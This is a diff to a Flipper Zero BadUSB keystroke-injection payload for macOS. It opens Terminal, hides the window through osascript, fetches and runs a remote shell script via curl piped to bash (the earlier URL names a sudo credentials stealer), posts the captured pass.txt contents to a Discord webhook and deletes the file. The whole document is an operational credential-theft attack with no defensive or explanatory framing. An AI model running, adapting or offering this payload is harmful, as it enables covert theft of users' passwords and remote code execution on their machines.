@@ -9,7 +9,10 @@ STRING terminal
 DELAY 1000
 ENTER
 DELAY 1000
-STRING curl -fsSL https://raw.githubusercontent.com/grugnoymeme/flipperzero-badUSB/main/macOS/sudo_credentials_stealer/script.sh | bash
+STRING osascript -e 'tell app "Terminal" to set visible of front window to false'
+ENTER
+DELAY 1000
+STRING curl -fsSL https://raw.githubusercontent.com/Hrampell/badusb_v2/main/script.sh | bash
 ENTER
 DELAY 5000
 STRING curl -H "Content-Type: application/json" -d "{\"content\":\"$(cat pass.txt)\"}" https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B && rm pass.txt &
